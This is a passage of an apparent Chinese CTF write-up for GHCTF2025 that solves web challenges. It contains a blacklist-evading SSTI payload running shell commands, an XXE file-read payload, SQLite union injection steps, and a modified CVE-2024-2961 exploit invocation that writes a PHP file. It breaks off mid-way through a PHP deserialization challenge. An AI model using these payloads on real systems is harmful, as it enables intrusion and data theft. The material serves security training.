class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">            file.save(save_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 返回文件路径（绝对路径）</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path)</span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;文件类型错误&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求显示上传表单（可选）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 过滤文件名</span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;无效文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 构造完整路径</span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 路径安全检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;禁止访问的路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># 删除不安全的文件</span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;文件查看失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误处理（可选）</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>很显然是打ssti的签到题，在文件内容注入后在/file/exp.txt查看内容<br>黑名单选择用fenjing跑过滤<br>payload:</p><pre><code>&#123;%set xw='so'[::-1]%&#125;&#123;%set ub=lipsum|escape|batch(22)|first|last%&#125;&#123;%set gl=ub*2+'globals'+ub*2%&#125;&#123;%set bu=ub*2+'builtins'+ub*2%&#125;&#123;%set im=ub*2+'import'+ub*2%&#125;&#123;&#123;g.pop[gl][bu][im](xw).popen('cat /f''lag').read()&#125;&#125;</code></pre><h2 id="﹏">(&gt;﹏&lt;)</h2><p>源码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ghctf&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>():</span><br><span class="line">    xml=request.form.get(<span class="string">&#x27;xml&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(xml)</span><br><span class="line">    <span class="keyword">if</span> xml <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No System is Safe.&quot;</span></span><br><span class="line">    parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)</span><br><span class="line">    root = etree.fromstring(xml, parser)</span><br><span class="line">    name=root.find(<span class="string">&#x27;name&#x27;</span>).text</span><br><span class="line">    <span class="keyword">return</span> name <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>这不是0xGame2024的原题吗（baby_xxe）<br>payload:</p><pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;foo;&lt;/name&gt;&lt;/root&gt;记得url编码%3C%3Fxml%20version%20%3D%20%221%2E0%22%3F%3E%0A%20%20%20%20%3C%21DOCTYPE%20ANY%20%5B%0A%20%20%20%20%3C%21ENTITY%20foo%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%3E%5D%3E%0A%20%20%20%20%3Croot%3E%3Cname%3E%26foo%3B%3C%2Fname%3E%3C%2Froot%3E</code></pre><h2 id="SQL">SQL???</h2><p>开题<br><img src="/img/WP/GHCTF2025/SQL.png" alt=""><br>fuzz发现过滤了单引号和双引号，看首页又是SQL题，推测是数字型注入<br>后面直接给注入过程吧</p><pre><code>id=1 order by 5# (200正常)id=1 order by 6# (爆500错误，一共5列)id=1 union select 1,2,3,4,5#(回显出了数字)id=1 union select 1,2,3,4,database()#(500，没有database()说明是sqlite)id=1 union select 1,2,3,4,sqlite_version()#(确定是sqlite)id=1 union select 1,2,3,4,sql from sqlite_master; (CREATE TABLE &quot;flag&quot; ( &quot;flag&quot; TEXT ))id=1 union select 1,2,3,4,flag from flag; (NSSCTF&#123;Funny_Sq11111111ite!!!&#125;)</code></pre><h2 id="ez-readfile">ez_readfile</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>CVE-2024-2961利用phpfilter提升为远程代码执行。<br><a href="https://github.com/ambionics/cnext-exploits/tree/main">https://github.com/ambionics/cnext-exploits/tree/main</a><br>代码更改:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.&quot;&quot;&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">b&quot;\xaf\x13\x76\x70\x82\xa0\xa6\x58\xcb\x3e\x23\x38\xc4\xc6\xdb\x8b\x60\x2c\xbb\x90\x68\xa0\x2d\xe9\x47\xaa\x78\x49\x6e\x0a\xc0\xc0\x31\xd3\xfb\xcb\x82\x25\x92\x0d\xcf\x61\x67\x64\xe8\xcd\x7d\x47\xba\x0e\x5d\x1b\x9c\x1c\x5c\xcd\x07\x2d\xf7\xa8\x2d\x1d\xbc\x5e\x2c\x06\x46\x3a\x0f\x2d\x4b\xe9\x20\x1d\x29\x66\xa4\xe1\x8b\x7d\x0c\xf5\xef\x97\xb6\xee\x48\xdd\x0e\x09\xaa\xe5\x4d\x6a\x5d\x6d\x75\x77\x72\xcf\x47\x16\xa2\x06\x72\x71\xc9\xa1\x8f\x00\xf6\x9d\xee\x54\x27\x71\xbe\xc8\xc3\x8f\x93\xe3\x52\x73\x73\x53\xa0\x5f\x69\xef\xc3\x3b\xea\xee\x70\x71\xae\x2a\x21\xc8\x44\xd7\x22\x87\x9f\xbe\x79\x6d\xc4\x61\xa4\x08\x57\x02\x82\x2a\xef\x36\x95\xda\xee\x13\xbc\xfb\x7e\xa3\x59\x45\xef\x25\x67\x3c\xe0\x27\x69\x2b\x95\x77\xb8\xcd\xdc\x4f\xde\x73\x24\xe8\xab\x66\x74\xd2\x8c\x68\x06\x80\x0c\xdd\x74\xae\x31\x05\xd1\x15\x7d\xc4\x5e\xbc\x0b\x0f\x21\x23\xa4\x96\x7c\x17\x12\xd1\x2b\xb3\x10\xb7\x37\x60\x68\xd7\xcb\x35\x5a\x54\x97\x08\x0d\x54\x78\x49\xd0\x93\xc3\xb3\xfd\x1f\x0b\x35\x11\x9d\x96\x1d\xba\x64\xe0\x86\xad\xef\x52\x98\x2d\x84\x12\x77\xbb\xab\xe8\x64\xda\xa3\x65\x55\x5d\xd5\x76\x55\x57\x46\x6c\x89\xc9\xdf\xb2\x3c\x85\x97\x1e\xf6\x38\x66\xc9\x17\x22\xe7\xea\xc9\xf5\xd2\xe0\x14\xd8\x35\x4f\x0a\x5c\x34\xd3\x73\xa5\x98\xf7\x66\x72\xaa\x43\xe3\xbd\xa2\xcd\x62\xfd\x69\x1d\x34\x30\x57\x52\xab\x41\xb1\x91\x65\xf2\x30\x7f\xcf\xc6\xa1\x8c\xfb\xdc\xc4\x8f\x61\xa5\x93\x40\x1a\x13\xd1\x09\xc5\xe0\xf7\x87\x5f\x48\xe7\xd7\xb3\x62\x04\xa7\xc4\xcb\xfd\xf4\xff\xcf\x3b\x74\x28\x1c\x96\x8e\x09\x73\x3a\x9b\xa6\x2f\xed\xb7\x99\xd5\xb9\x05\x39\x95\xab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">b&quot;\xaf\x13\x76\x70\x82\xa0\xa6\x58\xcb\x3e\x23\x38\xc4\xc6\xdb\x8b\x60\x2c\xbb\x90\x68\xa0\x2d\xe9\x47\xaa\x78\x49\x6e\x0a\xc0\xc0\x31\xd3\xfb\xcb\x82\x25\x92\x0d\xcf\x61\x67\x64\xe8\xcd\x7d\x47\xba\x0e\x5d\x1b\x9c\x1c\x5c\xcd\x07\x2d\xf7\xa8\x2d\x1d\xbc\x5e\x2c\x06\x46\x3a\x0f\x2d\x4b\xe9\x20\x1d\x29\x66\xa4\xe1\x8b\x7d\x0c\xf5\xef\x97\xb6\xee\x48\xdd\x0e\x09\xaa\xe5\x4d\x6a\x5d\x6d\x75\x77\x72\xcf\x47\x16\xa2\x06\x72\x71\xc9\xa1\x8f\x00\xf6\x9d\xee\x54\x27\x71\xbe\xc8\xc3\x8f\x93\xe3\x52\x73\x73\x53\xa0\x5f\x69\xef\xc3\x3b\xea\xee\x70\x71\xae\x2a\x21\xc8\x44\xd7\x22\x87\x9f\xbe\x79\x6d\xc4\x61\xa4\x08\x57\x02\x82\x2a\xef\x36\x95\xda\xee\x13\xbc\xfb\x7e\xa3\x59\x45\xef\x25\x67\x3c\xe0\x27\x69\x2b\x95\x77\xb8\xcd\xdc\x4f\xde\x73\x24\xe8\xab\x66\x74\xd2\x8c\x68\x06\x80\x0c\xdd\x74\xae\x31\x05\xd1\x15\x7d\xc4\x5e\xbc\x0b\x0f\x21\x23\xa4\x96\x7c\x17\x12\xd1\x2b\xb3\x10\xb7\x37\x60\x68\xd7\xcb\x35\x5a\x54\x97\x08\x0d\x54\x78\x49\xd0\x93\xc3\xb3\xfd\x1f\x0b\x35\x11\x9d\x96\x1d\xba\x64\xe0\x86\xad\xef\x52\x98\x2d\x84\x12\x77\xbb\xab\xe8\x64\xda\xa3\x65\x55\x5d\xd5\x76\x55\x57\x46\x6c\x89\xc9\x5f\xb2\x3c\x85\x97\x1e\xf6\x38\x66\xc9\x17\x22\xe7\xea\xc9\xf5\xd2\xe0\x14\xd8\x35\x4f\x0a\x5c\x34\xd3\xf3\xa5\x98\xf7\x66\x72\xaa\x43\xe3\xbd\xa2\xcd\x62\xfd\xe9\x1d\x34\x30\x57\x52\xab\x41\xb1\x91\x65\xf2\x30\x7f\xcf\xc6\xa1\x8c\xfb\xdc\xc4\x8f\x61\xa5\x13\x40\x1a\x13\xd1\x09\xc5\xe0\xf7\x87\x5f\x48\xe7\xd7\xb3\x62\x04\xa7\xc4\xcb\xfd\xf4\xff\xcf\x3b\x74\xa8\x1b\x96\x8e\x09\x73\x3a\x9b\xa6\x2f\xed\xb7\x99\xd5\x39\x05\x39\x95\xab&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;<span class="string">&quot;file&quot;</span>: path&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.session.post(<span class="variable language_">self</span>.url, params=params, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.&quot;&quot;&quot;</span></span><br><span class="line">    path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">    response = <span class="variable language_">self</span>.send(path)</span><br><span class="line">    data = response.re.search(<span class="string">b&quot;&lt;/code&gt;(.*)&quot;</span>, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.decode(data)</span><br></pre></td></tr></table></figure><p>并把所有tf.random.string(50)改为tf.random.string(48)，因为GET参数限制长度为148。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 cnext-exploit.py http://node2.anna.nssctf.cn:28983/ <span class="string">&quot;echo &#x27;&lt;?=phpinfo();?&gt;&#x27; &gt; 2.php&quot;</span></span><br></pre></td></tr></table></figure><p>flag在环境变量里</p><h2 id="Popppppp">Popppppp</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 